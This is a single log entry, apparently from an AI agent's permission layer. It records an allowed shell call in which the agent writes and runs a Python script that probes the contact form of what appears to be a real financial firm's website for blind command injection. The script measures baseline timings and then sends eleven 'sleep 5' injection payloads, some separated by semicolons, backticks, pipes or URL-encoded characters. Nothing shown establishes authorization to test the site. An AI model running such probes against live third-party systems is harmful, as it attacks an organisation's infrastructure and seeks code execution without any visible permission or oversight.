{"ts": 1790758870.0192096, "decision_id": "10ec06eb94d6", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > tool_outputs/d14_cmdi.py <<'EOF'\nimport time,subprocess,statistics,sys\nT=\"https://www.infinitycapital.bh\"\nUA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'\ndef get(url):\n    t=time.time()\n    p=subprocess.run([\"curl\",\"-s\",\"--http1.1\",\"-m\",\"25\",\"-o\",\"/dev/null\",\"-w\",\"%{http_code} %{size_download}\",url,\"-A\",UA],capture_output=True,text=True)\n    return time.time()-t, p.stdout.strip()\nbase=\"https://www.infinitycapital.bh/contact?x=\"\n# baseline\nbl=[get(base+\"1\")[0] for _ in range(8)]\nprint(\"baseline\", [round(x,2) for x in bl], \"median\", round(statistics.median(bl),3))\npayloads=[\n \"1;sleep 5\",\n \"1$(sleep 5)\",\n \"1`sleep 5`\",\n \"1|sleep 5\",\n \"1%3bsleep+5\",\n \"1%26%26sleep+5\",\n \"1||sleep+5\",\n \"1%0asleep+5\",\n \"1'||sleep 5||'\",\n \"1;sleep 5 #\",\n \"1%3b+sleep+5%23\",\n]\nres={}\nfor pl in payloads:\n    d,meta=get(base+pl)\n    res[pl]=(round(d,2),meta)\n    print(f\"{pl!r:28} -> {round(d,2)}s  {meta}\")\nopen(\"tool_outputs/d14_cmdi_contact_x.txt\",\"w\").write(repr(res))\nEOF\npython3 tool_outputs/d14_cmdi.py 2>&1 | tail -20"}
